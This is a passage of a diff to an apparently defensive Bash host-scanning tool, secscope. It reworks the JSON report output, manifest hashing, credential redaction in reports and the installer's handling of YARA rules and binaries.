+                "$(json_quote "${FINDING_CATS[$idx]}")" "$(json_quote "${FINDING_SUMMARIES[$idx]}")" "$(json_quote "${REDACTED_EV[$idx]:-$(redact_text "${FINDING_EVIDENCES[$idx]}")}")" \
                 "$(json_quote "${FINDING_RECOMMENDATIONS[$idx]}")" "$(json_quote "${FINDING_JUDGMENT_BASES[$idx]}")" "$(json_quote "${FINDING_ESCALATION_CONDITIONS[$idx]}")" \
                 "$(csv_json_array "${FINDING_EVIDENCE_DOMAINS[$idx]}")" "${FINDING_DOMAIN_COUNTS[$idx]:-0}" "$(json_quote "${FINDING_COUNTER_EVIDENCE[$idx]}")" "$(lines_json_array "${FINDING_TIMELINES[$idx]}")" \
                 "$(json_quote "${FINDING_RULE_IDS[$idx]}")" "$(json_quote "${FINDING_ENTITY_KEYS[$idx]}")" "$(json_quote "${FINDING_ENTITY_TYPES[$idx]:-GENERIC}")" "$(json_quote "${FINDING_FINGERPRINTS[$idx]}")" "$(json_quote "${FINDING_EVIDENCE_HASHES[$idx]}")" \
@@ -8304,7 +9329,10 @@ write_findings_json() {
             printf ']}'
         done
         printf '\n  ],\n  "file_changes":['
+        # v2.1：JSON 摘要封顶 500 条（完整清单在 raw/file-changes.tsv）。
+        local file_changes_cap=500
         for idx in "${!FILE_BEHAVIOR_PATHS[@]}"; do
+            [ "$idx" -ge "$file_changes_cap" ] && break
             [ "$idx" -gt 0 ] && printf ','
             file_context="${FILE_BEHAVIOR_CONTEXTS[$idx]}"
             printf '{"path":%s,"action":%s,"priority_score":%s,"priority_reasons":%s,"size_bytes":%s,"md5":%s,"sha256":%s,"process_context":%s,"network_context":%s,"reason":%s}' \
@@ -8335,11 +9363,22 @@ raw_status_for() {
 
 write_raw_manifest() {
     local file="${OUTPUT_DIR}/raw-manifest.json" raw rel hash size meta status source error first=true
+    # 清单哈希一次载入，替代循环内每文件一次 awk。
+    declare -A MANIFEST_HASH=()
+    local mline m_hash m_rel
+    if [ -s "${RAW_DIR}/manifest.sha256" ]; then
+        while IFS= read -r mline; do
+            [ -n "$mline" ] || continue
+            m_hash="${mline%% *}"
+            m_rel="${mline#* }"; [[ "$m_rel" == " "* ]] && m_rel="${m_rel# }"
+            [ -n "$m_hash" ] && [ -n "$m_rel" ] && MANIFEST_HASH["$m_rel"]="$m_hash"
+        done < "${RAW_DIR}/manifest.sha256"
+    fi
     {
         printf '{\n  "schema_version": 3, "report_version": %s, "platform":"linux", "run_id": %s, "files": [\n' "$(json_quote "$SCRIPT_VERSION")" "$(json_quote "$RUN_ID")"
         while IFS= read -r raw; do
             rel="${raw#${RAW_DIR}/}"
-            hash=$(awk -v rel="$rel" '$2==rel {print $1; exit}' "${RAW_DIR}/manifest.sha256" 2>/dev/null)
+            hash="${MANIFEST_HASH[$rel]:-}"
             [ -n "$hash" ] || hash=$(sha256_file "$raw" 2>/dev/null || true)
             size=$(stat -c '%s' -- "$raw" 2>/dev/null || stat -f '%z' -- "$raw" 2>/dev/null || echo 0)
             meta=$(raw_status_for "$rel"); IFS=$'\t' read -r status source error <<< "$meta"
@@ -8354,6 +9393,25 @@ write_raw_manifest() {
 
 write_report_manifest() {
     local file="${OUTPUT_DIR}/report-manifest.json" item rel hash size first=true raw_rel
+    # 清单哈希一次载入，替代循环内每文件一次 awk。
+    declare -A REPORT_HASH=() RAWLIST_HASH=()
+    local mline m_hash m_rel
+    if [ -s "${OUTPUT_DIR}/report.sha256" ]; then
+        while IFS= read -r mline; do
+            [ -n "$mline" ] || continue
+            m_hash="${mline%% *}"
+            m_rel="${mline#* }"; [[ "$m_rel" == " "* ]] && m_rel="${m_rel# }"
+            [ -n "$m_hash" ] && [ -n "$m_rel" ] && REPORT_HASH["$m_rel"]="$m_hash"
+        done < "${OUTPUT_DIR}/report.sha256"
+    fi
+    if [ -s "${RAW_DIR}/manifest.sha256" ]; then
+        while IFS= read -r mline; do
+            [ -n "$mline" ] || continue
+            m_hash="${mline%% *}"
+            m_rel="${mline#* }"; [[ "$m_rel" == " "* ]] && m_rel="${m_rel# }"
+            [ -n "$m_hash" ] && [ -n "$m_rel" ] && RAWLIST_HASH["$m_rel"]="$m_hash"
+        done < "${RAW_DIR}/manifest.sha256"
+    fi
     {
         printf '{\n  "schema_version": 3, "report_version": %s, "platform":"linux", "run_id": %s, "files": [\n' "$(json_quote "$SCRIPT_VERSION")" "$(json_quote "$RUN_ID")"
         while IFS= read -r item; do
@@ -8363,8 +9421,8 @@ write_report_manifest() {
             esac
             hash=""
             case "$rel" in
-                raw/*) raw_rel="${rel#raw/}"; hash=$(awk -v rel="$raw_rel" '$2==rel {print $1; exit}' "${RAW_DIR}/manifest.sha256" 2>/dev/null) ;;
-                *) hash=$(awk -v rel="$rel" '$2==rel {print $1; exit}' "${OUTPUT_DIR}/report.sha256" 2>/dev/null) ;;
+                raw/*) raw_rel="${rel#raw/}"; hash="${RAWLIST_HASH[$raw_rel]:-}" ;;
+                *) hash="${REPORT_HASH[$rel]:-}" ;;
             esac
             [ -n "$hash" ] || hash=$(sha256_file "$item" 2>/dev/null || true)
             size=$(stat -c '%s' -- "$item" 2>/dev/null || stat -f '%z' -- "$item" 2>/dev/null || echo 0)
@@ -8417,7 +9475,7 @@ print('\t'.join((str(expected),str(scanned),str(skipped),str(errors),json.dumps(
 PY
         )
     fi
-    if [ "$static_errors" -gt 0 ] || [ "$static_skipped" -gt 0 ] || [ "$YARA_ERROR_COUNT" -gt 0 ] || [ "$YARA_TIMEOUT_COUNT" -gt 0 ]; then scan_completion_status=PARTIAL; fi
+    if [ "$static_errors" -gt 0 ] || [ "$static_skipped" -gt 0 ]; then scan_completion_status=PARTIAL; fi
     if [ "$STATIC_CANDIDATE_STATUS" = PARTIAL ] && [ "$static_expected" -eq 0 ]; then scan_completion_status=INCONCLUSIVE; fi
     STATUS_FILE="${OUTPUT_DIR}/status.json"
     {
@@ -8453,23 +9511,32 @@ PY
         printf '  "observation_severity":{"CRITICAL":%s,"HIGH":%s,"MEDIUM":%s,"LOW":%s,"OBSERVE":%s},\n' "$OBSERVATION_CRITICAL" "$OBSERVATION_HIGH" "$OBSERVATION_MEDIUM" "$OBSERVATION_LOW" "$OBSERVATION_OBSERVE"
         printf '  "threat_verdict":{"summary":%s,"severity":{"CRITICAL":%s,"HIGH":%s,"MEDIUM":%s,"LOW":%s}},\n' "$(json_quote "$(verdict_text)")" "$THREAT_CRITICAL" "$THREAT_HIGH" "$THREAT_MEDIUM" "$THREAT_LOW"
         printf '  "baseline_posture":{"summary":%s,"severity":{"CRITICAL":%s,"HIGH":%s,"MEDIUM":%s,"LOW":%s}},\n' "$(json_quote "$([ "$BASELINE_CRITICAL" -gt 0 ] && echo 严重 || { [ "$BASELINE_HIGH" -gt 0 ] && echo 高风险 || echo 需持续加固; })")" "$BASELINE_CRITICAL" "$BASELINE_HIGH" "$BASELINE_MEDIUM" "$BASELINE_LOW"
-        printf '  "visibility_status":{"summary":%s,"module_coverage_percent":%s,"source_availability_percent":%s,"interpretation":"未发现仅表示在当前可见性和时间窗口内未形成规则证据，不代表确认安全。","file_monitor_status":%s,"patch_status":%s,"event_window_minutes":%s,"event_count":%s,"web_access_parsed":%s,"web_access_failed":%s,"sources":{"snapshot":%s,"auditd":%s,"falco":%s,"yara":%s,"ima":%s,"web_access":%s,"container":%s,"kubernetes":%s}},\n' \
+        printf '  "visibility_status":{"summary":%s,"module_coverage_percent":%s,"source_availability_percent":%s,"interpretation":"未发现仅表示在当前可见性和时间窗口内未形成规则证据，不代表确认安全。","file_monitor_status":%s,"patch_status":%s,"event_window_minutes":%s,"event_count":%s,"web_access_parsed":%s,"web_access_failed":%s,"sources":{"snapshot":%s,"auditd":%s,"falco":%s,"ima":%s,"web_access":%s,"container":%s,"kubernetes":%s}},\n' \
             "$(json_quote "$TELEMETRY_EXPLANATION")" "$RUN_COVERAGE" "$SOURCE_AVAILABILITY_PERCENT" "$(json_quote "$FILE_SCAN_STATUS")" "$(json_quote "$PATCH_STATUS")" \
-            "$EVENT_WINDOW_MINUTES" "$EVENT_COUNT" "$WEB_ACCESS_LOG_PARSED" "$WEB_ACCESS_LOG_FAILED" "$(json_quote "$EVENT_SOURCE_SNAPSHOT")" "$(json_quote "$EVENT_SOURCE_AUDITD")" "$(json_quote "$EVENT_SOURCE_FALCO")" "$(json_quote "$EVENT_SOURCE_YARA")" "$(json_quote "$EVENT_SOURCE_IMA")" "$(json_quote "$WEB_ACCESS_LOG_STATUS")" "$(json_quote "$CONTAINER_CONTEXT_STATUS")" "$(json_quote "$KUBERNETES_CONTEXT_STATUS")"
+            "$EVENT_WINDOW_MINUTES" "$EVENT_COUNT" "$WEB_ACCESS_LOG_PARSED" "$WEB_ACCESS_LOG_FAILED" "$(json_quote "$EVENT_SOURCE_SNAPSHOT")" "$(json_quote "$EVENT_SOURCE_AUDITD")" "$(json_quote "$EVENT_SOURCE_FALCO")" "$(json_quote "$EVENT_SOURCE_IMA")" "$(json_quote "$WEB_ACCESS_LOG_STATUS")" "$(json_quote "$CONTAINER_CONTEXT_STATUS")" "$(json_quote "$KUBERNETES_CONTEXT_STATUS")"
         printf '  "host_role":%s,"maintenance_active":%s,"source_availability_percent":%s,\n' "$(json_quote "$HOST_ROLE")" "$MAINTENANCE_ACTIVE" "$SOURCE_AVAILABILITY_PERCENT"
         printf '  "priority_count":%s,"state_health":%s,"auth_profile_health":%s,"finding_count":%s,"ioc_count":%s,\n' "${#PRIORITY_KEYS[@]}" "$(json_quote "$STATE_HEALTH")" "$(json_quote "$AUTH_PROFILE_HEALTH")" "${#FINDINGS[@]}" "${#IOCS[@]}"
+        # v2.3（审计 F2）：status.json 此前只有 ioc_count 没有 iocs 数组，
+        # v2 报告与 ioc_export 的 IOC 数据源实际恒为空（契约断链）。
+        printf '  "iocs":['
+        local ioc_arr_idx=0
+        for _ioc_key in "${IOCS[@]}"; do
+            [ "$ioc_arr_idx" -gt 0 ] && printf ','
+            printf '{"type":%s,"value":%s,"context":%s}' "$(json_quote "${IOC_TYPES[$ioc_arr_idx]:-}")" "$(json_quote "${IOC_VALUES[$ioc_arr_idx]:-}")" "$(json_quote "${IOC_CONTEXTS[$ioc_arr_idx]:-}")"
+            ioc_arr_idx=$((ioc_arr_idx + 1))
+        done
+        printf '],\n' 
         printf '  "patch_posture":{"status":%s,"latest_update":%s,"age_days":%s,"lifecycle_status":"需人工确认"},\n' "$(json_quote "$PATCH_STATUS")" "$(json_quote "$PATCH_LATEST")" "$PATCH_AGE_DAYS"
         printf '  "file_monitoring":{"mode":%s,"status":%s,"baseline":%s,"scanned_files":%s,"small_files_prioritized":%s,"added_small_files":%s,"skipped_files":%s,"hash_success":%s,"hash_computed":%s,"hash_reused":%s,"hash_failed":%s,"changes":%s,"suspicious_groups":%s,"observe_groups":%s,"config_status":%s,"config_warnings":%s,"limits":{"max_files":%s,"max_depth":%s,"max_hash_bytes":%s,"small_file_priority_bytes":%s,"timeout_seconds":%s},"priority_model":{"sort_order":["priority_score_desc","mtime_desc","size_asc","path_asc"],"weights":{"added_small":%s,"modified":%s,"runtime_exe":%s,"runtime_mapped":%s,"web_root":%s,"tmp_executable":%s,"persistence_path":%s,"recent":%s,"suspicious_extension":%s}}},\n' \
             "$(json_quote "$FILE_SCAN_MODE")" "$(json_quote "$FILE_SCAN_STATUS")" "$FILE_SCAN_BASELINE" "$FILE_SCAN_SCANNED" "$FILE_SCAN_SMALL_PRIORITY" "$FILE_SCAN_ADDED_SMALL" "$FILE_SCAN_SKIPPED" "$((FILE_SCAN_HASH_SUCCESS + FILE_SCAN_HASH_REUSED))" "$FILE_SCAN_HASH_SUCCESS" "$FILE_SCAN_HASH_REUSED" "$FILE_SCAN_HASH_FAILED" "$FILE_SCAN_CHANGES" "$FILE_SCAN_SUSPICIOUS" "$FILE_SCAN_OBSERVE" "$(json_quote "$FILE_SCAN_CONFIG_STATUS")" "$(json_quote "$FILE_SCAN_CONFIG_WARNINGS")" "$FILE_MAX_FILES" "$FILE_MAX_DEPTH" "$FILE_MAX_HASH_BYTES" "$FILE_SMALL_PRIORITY_BYTES" "$FILE_TIMEOUT_SECONDS" "$FILE_PRIORITY_ADDED_SMALL" "$FILE_PRIORITY_MODIFIED" "$FILE_PRIORITY_RUNTIME_EXE" "$FILE_PRIORITY_RUNTIME_MAPPED" "$FILE_PRIORITY_WEB_ROOT" "$FILE_PRIORITY_TMP_EXECUTABLE" "$FILE_PRIORITY_PERSISTENCE_PATH" "$FILE_PRIORITY_RECENT" "$FILE_PRIORITY_SUSPICIOUS_EXTENSION"
-        printf '  "file_scan":{"status":%s,"priority_model":{"algorithm":"additive_weights","sort_order":["priority_score_desc","mtime_desc","size_asc","path_asc"],"config_status":%s,"config_warnings":%s}},\n' "$(json_quote "$FILE_SCAN_STATUS")" "$(json_quote "$FILE_SCAN_CONFIG_STATUS")" "$(json_quote "$FILE_SCAN_CONFIG_WARNINGS")"
-        printf '  "yara":{"status":%s,"mode":%s,"scanner":%s,"scanner_version":%s,"rules_loaded":%s,"scanned":%s,"matched":%s,"timeout":%s,"error":%s,"promoted_findings":%s,"limits":{"max_files":%s,"file_timeout_seconds":%s,"total_timeout_seconds":%s,"max_rule_sources":%s,"rule_max_depth":%s},"raw":["raw/yara-capability.json","raw/yara-results.jsonl","raw/yara-errors.tsv","raw/yara-findings.tsv","raw/yara-summary.json"]},\n' \
-            "$(json_quote "$EVENT_SOURCE_YARA")" "$(json_quote "$YARA_MODE")" "$(json_quote "${YARA_SCANNER:-none}")" "$(json_quote "$YARA_SCANNER_VERSION")" \
-            "$YARA_RULES_LOADED" "$YARA_SCANNED" "$YARA_MATCHED" "$YARA_TIMEOUT_COUNT" "$YARA_ERROR_COUNT" "$YARA_PROMOTED_FINDINGS" \
-            "$YARA_MAX_FILES" "$YARA_FILE_TIMEOUT" "$YARA_TOTAL_TIMEOUT" "$YARA_MAX_RULE_SOURCES" "$YARA_RULE_MAX_DEPTH"
+        # v2.3 修复：S4 简化时丢失了 raw/changes/hash 计数键，自检契约
+        # （"raw" in file_scan）与 v2 报告 file_scan 区数据需要它们。
+        printf '  "file_scan":{"status":%s,"changes":%s,"hash_success":%s,"hash_reused":%s,"hash_failed":%s,"priority_model":{"algorithm":"additive_weights","sort_order":["priority_score_desc","mtime_desc","size_asc","path_asc"],"config_status":%s,"config_warnings":%s},"raw":["raw/file-inventory-current.tsv","raw/file-changes.tsv","raw/suspicious-files.tsv"]},\n' "$(json_quote "$FILE_SCAN_STATUS")" "$FILE_SCAN_CHANGES" "${FILE_SCAN_HASH_SUCCESS:-0}" "${FILE_SCAN_HASH_REUSED:-0}" "${FILE_SCAN_HASH_FAILED:-0}" "$(json_quote "$FILE_SCAN_CONFIG_STATUS")" "$(json_quote "$FILE_SCAN_CONFIG_WARNINGS")"
+        printf '  "yara_diff":{"status":%s,"scanner":"yara-x","rules_sha256":%s,"scanned_files":%s,"matched":%s,"raw":["raw/yara-diff-summary.json","raw/yara-diff-results.jsonl"]},\n' "$(json_quote "$YARA_DIFF_STATUS")" "$(json_quote "${YARA_DIFF_RULES_SHA:-}")" "$YARA_DIFF_SCANNED" "$YARA_DIFF_MATCHED"
         printf '  "web_access_log":{"WEB_ACCESS_LOG_STATUS":%s,"status":%s,"format":%s,"max_lines":%s,"source_files":%s,"sampled_lines":%s,"parsed_lines":%s,"failed_lines":%s,"raw":["raw/web-access-recent.log","raw/web-access-normalized.tsv"]},\n' "$(json_quote "$WEB_ACCESS_LOG_STATUS")" "$(json_quote "$WEB_ACCESS_LOG_STATUS")" "$(json_quote "$WEB_ACCESS_LOG_FORMAT")" "$WEB_ACCESS_LOG_MAX_LINES" "$WEB_ACCESS_LOG_FILES" "$WEB_ACCESS_LOG_LINES" "$WEB_ACCESS_LOG_PARSED" "$WEB_ACCESS_LOG_FAILED"
         printf '  "container_context":{"status":%s,"process_count":%s,"raw":"raw/container-context.tsv"},\n' "$(json_quote "$CONTAINER_CONTEXT_STATUS")" "$CONTAINER_CONTEXT_COUNT"
         printf '  "kubernetes_context":{"status":%s,"evidence_count":%s,"anomaly_count":%s,"raw":"raw/kubernetes-context.tsv"},\n' "$(json_quote "$KUBERNETES_CONTEXT_STATUS")" "$KUBERNETES_CONTEXT_COUNT" "$KUBERNETES_ANOMALY_COUNT"
-        printf '  "telemetry_health":{"status":%s,"hunt_depth_score":%s,"source_availability_percent":%s,"explanation":%s,"sources":{"snapshot":%s,"auditd":%s,"falco":%s,"yara":%s,"ima":%s,"web_access":%s}},\n' "$(json_quote "$TELEMETRY_STATUS")" "$RUN_COVERAGE" "$SOURCE_AVAILABILITY_PERCENT" "$(json_quote "$TELEMETRY_EXPLANATION")" "$(json_quote "$EVENT_SOURCE_SNAPSHOT")" "$(json_quote "$EVENT_SOURCE_AUDITD")" "$(json_quote "$EVENT_SOURCE_FALCO")" "$(json_quote "$EVENT_SOURCE_YARA")" "$(json_quote "$EVENT_SOURCE_IMA")" "$(json_quote "$WEB_ACCESS_LOG_STATUS")"
+        printf '  "telemetry_health":{"status":%s,"hunt_depth_score":%s,"source_availability_percent":%s,"explanation":%s,"sources":{"snapshot":%s,"auditd":%s,"falco":%s,"ima":%s,"web_access":%s}},\n' "$(json_quote "$TELEMETRY_STATUS")" "$RUN_COVERAGE" "$SOURCE_AVAILABILITY_PERCENT" "$(json_quote "$TELEMETRY_EXPLANATION")" "$(json_quote "$EVENT_SOURCE_SNAPSHOT")" "$(json_quote "$EVENT_SOURCE_AUDITD")" "$(json_quote "$EVENT_SOURCE_FALCO")" "$(json_quote "$EVENT_SOURCE_IMA")" "$(json_quote "$WEB_ACCESS_LOG_STATUS")"
         printf '  "process_behavior_baseline":{"status":%s,"health":%s,"observed_processes":%s,"mature_processes":%s,"learning_runs_required":3,"raw":"raw/process-behavior-baseline.tsv"},\n' "$(json_quote "$([ "$STATE_ENABLED" = true ] && printf SUCCESS || printf UNAVAILABLE)")" "$(json_quote "$PROCESS_BEHAVIOR_HEALTH")" "$PROCESS_BEHAVIOR_OBSERVED" "$PROCESS_BEHAVIOR_MATURE"
         printf '  "false_positive_suppression":{"status":"SUCCESS","count":%s,"raw":"raw/suppression-audit.tsv"},\n' "$SUPPRESSION_COUNT"
         printf '  "web_runtime_baseline":{"status":%s,"health":%s,"observed_objects":%s,"changes":%s,"raw":"raw/web-runtime-baseline.tsv"},\n' "$(json_quote "$([ "$WEB_RUNTIME_BASELINE_HEALTH" = NOT_APPLICABLE ] && printf NOT_APPLICABLE || printf SUCCESS)")" "$(json_quote "$WEB_RUNTIME_BASELINE_HEALTH")" "$WEB_RUNTIME_OBSERVED" "$WEB_RUNTIME_CHANGES"
@@ -8483,11 +9550,29 @@ PY
         printf '  "attack_chains":{"status":"DISABLED","count":0,"items":[]},\n'
         printf '  "antivirus_products":['; for idx in "${!ENDPOINT_NAMES[@]}"; do [ "$idx" -gt 0 ] && printf ','; printf '{"name":%s,"status":%s,"source":%s,"details":%s}' "$(json_quote "${ENDPOINT_NAMES[$idx]}")" "$(json_quote "${ENDPOINT_STATUSES[$idx]}")" "$(json_quote "${ENDPOINT_SOURCES[$idx]}")" "$(json_quote "${ENDPOINT_DETAILS[$idx]}")"; done; printf '],\n'
         printf '  "lifecycle":{"NEW":%s,"ONGOING":%s,"CHANGED":%s,"ESCALATED":%s,"DEESCALATED":%s,"REOPENED":%s,"RESOLVED":%s,"BASELINE_EXISTING":%s},\n' "$LIFECYCLE_NEW" "$LIFECYCLE_ONGOING" "$LIFECYCLE_CHANGED" "$LIFECYCLE_ESCALATED" "$LIFECYCLE_DEESCALATED" "$LIFECYCLE_REOPENED" "$LIFECYCLE_RESOLVED" "$LIFECYCLE_BASELINE"
+        # v2.3（F5）：已解决明细进 status.json，供 v2 渲染器生命周期专区消费
+        #（此前 RESOLVED 明细只存在于 legacy 渲染器）。
+        printf '  "resolved_details":['
+        local rsv_idx=0
+        for _rsv_fp in "${RESOLVED_FPS[@]}"; do
+            [ "$rsv_idx" -gt 0 ] && printf ','
+            printf '{"fingerprint":%s,"rule_id":%s,"severity":%s,"category":%s,"summary":%s,"first_seen":%s,"last_seen":%s}' \
+                "$(json_quote "${RESOLVED_FPS[$rsv_idx]:-}")" "$(json_quote "${RESOLVED_RULE_IDS[$rsv_idx]:-}")" \
+                "$(json_quote "${RESOLVED_SEVS[$rsv_idx]:-}")" "$(json_quote "${RESOLVED_CATS[$rsv_idx]:-}")" \
+                "$(json_quote "${RESOLVED_SUMMARIES[$rsv_idx]:-}")" "$(json_quote "${RESOLVED_FIRST_SEEN[$rsv_idx]:-}")" \
+                "$(json_quote "${RESOLVED_LAST_SEEN[$rsv_idx]:-}")"
+            rsv_idx=$((rsv_idx + 1))
+        done
+        printf '],\n' 
         printf '  "component_inventory":['
         for idx in "${!COMPONENT_NAMES[@]}"; do [ "$idx" -gt 0 ] && printf ','; printf '{"name":%s,"version":%s,"source":%s,"support_status":%s}' "$(json_quote "${COMPONENT_NAMES[$idx]}")" "$(json_quote "${COMPONENT_VERSIONS[$idx]}")" "$(json_quote "${COMPONENT_SOURCES[$idx]}")" "$(json_quote "${COMPONENT_SUPPORT[$idx]}")"; done
         printf '],\n'
         printf '  "suspicious_files":['
+        # v2.1：JSON 摘要封顶 200 条（完整 5000+ 条在 raw/suspicious-files.tsv）。
+        # one-shot 全量模式 5000 条 × 14 字段 printf 是汇总阶段的主要耗时源。
+        local suspicious_json_cap=200
         for idx in "${!FILE_BEHAVIOR_PATHS[@]}"; do
+            [ "$idx" -ge "$suspicious_json_cap" ] && break
             [ "$idx" -gt 0 ] && printf ','
             file_context="${FILE_BEHAVIOR_CONTEXTS[$idx]}"
             printf '{"path":%s,"action":%s,"priority":%s,"priority_score":%s,"priority_reasons":%s,"size_bytes":%s,"severity":%s,"confidence":%s,"md5":%s,"sha256":%s,"process_context":%s,"network_context":%s,"reason":%s,"context":%s}' \
@@ -8505,8 +9590,8 @@ PY
         echo '  "modules": ['
         for idx in "${!MODULE_IDS[@]}"; do
             [ "$idx" -gt 0 ] && printf ',\n'
-            printf '    {"id":%s,"status":%s,"duration_seconds":%s,"errors":[%s],"error":%s,"planned_sources":%s,"successful_sources":%s,"no_result_sources":%s,"unavailable_sources":%s,"failed_sources":%s,"missing_sources":%s,"coverage_percent":%s}' \
-                "$(json_quote "${MODULE_IDS[$idx]}")" "$(json_quote "${MODULE_STATUSES[$idx]}")" \
+            printf '    {"id":%s,"name":%s,"status":%s,"duration_seconds":%s,"errors":[%s],"error":%s,"planned_sources":%s,"successful_sources":%s,"no_result_sources":%s,"unavailable_sources":%s,"failed_sources":%s,"missing_sources":%s,"coverage_percent":%s}' \
+                "$(json_quote "${MODULE_IDS[$idx]}")" "$(json_quote "${MODULE_NAMES[$idx]:-}")" "$(json_quote "${MODULE_STATUSES[$idx]}")" \
                 "${MODULE_DURATIONS[$idx]}" "$([ -n "${MODULE_ERRORS[$idx]}" ] && json_quote "${MODULE_ERRORS[$idx]}" || true)" "$(json_quote "${MODULE_ERRORS[$idx]}")" \
                 "$(csv_json_array "${MODULE_PLANNED_SOURCES[$idx]}")" "$(csv_json_array "${MODULE_SUCCESSFUL_SOURCES[$idx]}")" "$(csv_json_array "${MODULE_NO_RESULT_SOURCES[$idx]}")" "$(csv_json_array "${MODULE_UNAVAILABLE_SOURCES[$idx]}")" "$(csv_json_array "${MODULE_FAILED_SOURCES[$idx]}")" "$(csv_json_array "${MODULE_MISSING_SOURCES[$idx]}")" "${MODULE_COVERAGES[$idx]:-0}"
         done
@@ -8551,6 +9636,34 @@ detect_host_role() {
         HOST_ROLE="bastion"
     else
         HOST_ROLE="generic"
+    fi
+}
+
+# NUL 分隔流的批量脱敏：一次 perl 调用处理全部记录，替代报告阶段
+# 每条 finding 一次 redact_text 的 fork。输入/输出都以 \0 分隔。
+redact_batch_stream() {
+    if [ "$INCLUDE_SENSITIVE" = true ]; then
+        cat
+        return 0
+    fi
+    if command -v perl >/dev/null 2>&1; then
+        perl -0 -pe '
+            s/((?<![A-Za-z0-9_])(?:password|passwd|token|secret|api[_-]?key|authorization|cookie|credential)[[:space:]]*[=:][[:space:]]*)(?:"[^"]*"|'"'"'[^'"'"']*'"'"'|[^[:space:];]+)/${1}[REDACTED]/ig;
+            s/((?:--(?:password|passwd|token|secret|api[_-]?key|authorization|cookie|credential)|-[Uu])(?:=|[[:space:]]+))(?:"[^"]*"|'"'"'[^'"'"']*'"'"'|[^[:space:];]+)/${1}[REDACTED]/ig;
+            s/((?:Bearer|Basic)[[:space:]]+)[A-Za-z0-9._~+\/-]+=*/${1}[REDACTED]/ig;
+            s#(https?://)[^/@\s]+@#${1}[REDACTED]\@#ig;
+            $_ .= "\0" unless eof'
+    else
+        # 无 perl 时逐记录 sed（罕见回退路径；多行记录不能整体 tr，否则破坏内部换行）
+        local rec
+        while IFS= read -r -d $'\0' rec; do
+            printf '%s' "$rec" | sed -E \
+                -e 's/((^|[^[:alnum:]_])(password|passwd|token|secret|api[_-]?key|authorization|cookie|credential)[[:space:]]*[=:][[:space:]]*)[^[:space:];]+/\1[REDACTED]/Ig' \
+                -e 's/((--(password|passwd|token|secret|api[_-]?key|authorization|cookie|credential)|-[Uu])(=|[[:space:]]+))[^[:space:];]+/\1[REDACTED]/Ig' \
+                -e 's/((Bearer|Basic)[[:space:]]+)[A-Za-z0-9._~+\/-]+/\1[REDACTED]/Ig' \
+                -e 's#(https?://)[^/@[:space:]]+@#\1[REDACTED]@#Ig'
+            printf '\0'
+        done
     fi
 }
 
@@ -8794,18 +9907,12 @@ CRON
 install_secscope() {
     [ "$(id -u)" -eq 0 ] || { log_error "安装需要 root 权限"; return 1; }
     command -v systemctl >/dev/null 2>&1 || { log_error "系统不支持 systemd"; return 1; }
-    local source_path target="/opt/secscope/secscope.sh" config_file="/etc/secscope/secscope.conf" module module_source module_target runtime_dir yr_sha
+    local source_path target="/opt/secscope/secscope.sh" config_file="/etc/secscope/secscope.conf" module module_source module_target
     local schedule_mode schedule_time schedule_cron cron_file="/etc/cron.d/secscope"
     source_path=$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd -P)/$(basename "${BASH_SOURCE[0]}")
     install -d -m 0700 /opt/secscope /opt/secscope/modules /opt/secscope/helpers /opt/secscope/helpers/java \
-        /opt/secscope/rules /opt/secscope/rules/yara-forge-core-20260809 \
+        /opt/secscope/rules \
         /opt/secscope/native/secscope-scanner /opt/secscope/native/secscope-cache /etc/secscope /var/lib/secscope
-    case "$(uname -m)" in
-        x86_64|amd64) runtime_dir=linux-amd64; yr_sha=dd5e5c07a0397ad922b597b8d6c35c22485ec9fe4bf26f064d242245042cdca2 ;;
-        aarch64|arm64) runtime_dir=linux-arm64; yr_sha=b86c03c2868c05d760662974351e9701d1ef8edfa47644f4c68e3e341cba1759 ;;
-        *) log_error "不支持的 CPU 架构: $(uname -m)"; return 1 ;;
-    esac
-    install -d -m 0700 "/opt/secscope/runtime/${runtime_dir}/bin"
     if [ "$source_path" != "$target" ]; then
         install -m 0500 "$source_path" "$target" || { log_error "无法安装主程序: $target"; return 1; }
     else
@@ -8825,8 +9932,25 @@ install_secscope() {
         for module in profile.sh yara.sh; do printf '%s  modules/%s\n' "$(sha256_file "/opt/secscope/modules/${module}")" "$module"; done
     } > "${target}.sha256"
     chmod 0400 "${target}.sha256"
+    local arch_dir
+    case "$(uname -m)" in
+        x86_64|amd64) arch_dir=linux-amd64 ;;
+        aarch64|arm64) arch_dir=linux-arm64 ;;
+        *) arch_dir="" ;;
+    esac
+    if [ -n "$arch_dir" ] && [ -x "${PROGRAM_DIR}/runtime/${arch_dir}/bin/yr" ] && [ ! -L "${PROGRAM_DIR}/runtime/${arch_dir}/bin/yr" ]; then
+        install -d -m 0700 "/opt/secscope/runtime/${arch_dir}/bin"
+        install -m 0500 "${PROGRAM_DIR}/runtime/${arch_dir}/bin/yr" "/opt/secscope/runtime/${arch_dir}/bin/yr" || return 1
+    fi
+    if [ -d "${PROGRAM_DIR}/rules/yara-forge" ]; then
+        install -d -m 0700 /opt/secscope/rules/yara-forge
+        for yar in "${PROGRAM_DIR}"/rules/yara-forge/*.yar; do
+            [ -f "$yar" ] && [ ! -L "$yar" ] || continue
+            install -m 0400 "$yar" "/opt/secscope/rules/yara-forge/$(basename "$yar")" || return 1
+        done
+    fi
     local helper
-    for helper in yara_normalizer.py yara_promoter.py rat_engine.py threat_intel.py corpus_manifest.py route_static_candidates.py; do
+    for helper in rat_engine.py threat_intel.py corpus_manifest.py route_static_candidates.py; do
         if [ -f "${PROGRAM_DIR}/helpers/${helper}" ] && [ ! -L "${PROGRAM_DIR}/helpers/${helper}" ]; then
             install -m 0500 "${PROGRAM_DIR}/helpers/${helper}" "/opt/secscope/helpers/${helper}" || {
                 log_error "无法安装只读解析 helper: ${helper}"; return 1;
@@ -8847,31 +9971,24 @@ install_secscope() {
             }
         fi
     done
-    if [ -f "${PROGRAM_DIR}/rules/yara-forge-core-20260809/yara-rules-core.yar" ] && \
-       [ ! -L "${PROGRAM_DIR}/rules/yara-forge-core-20260809/yara-rules-core.yar" ]; then
-        install -m 0400 "${PROGRAM_DIR}/rules/yara-forge-core-20260809/yara-rules-core.yar" \
-            /opt/secscope/rules/yara-forge-core-20260809/yara-rules-core.yar || {
-            log_error '无法安装内置 YARA Forge Core 规则'; return 1;
-        }
-    else
-        log_error '内置 YARA Forge Core 规则缺失'; return 1
-    fi
-    if [ -x "${PROGRAM_DIR}/runtime/${runtime_dir}/bin/yr" ] && [ ! -L "${PROGRAM_DIR}/runtime/${runtime_dir}/bin/yr" ]; then
-        [ "$(sha256_file "${PROGRAM_DIR}/runtime/${runtime_dir}/bin/yr")" = "$yr_sha" ] || {
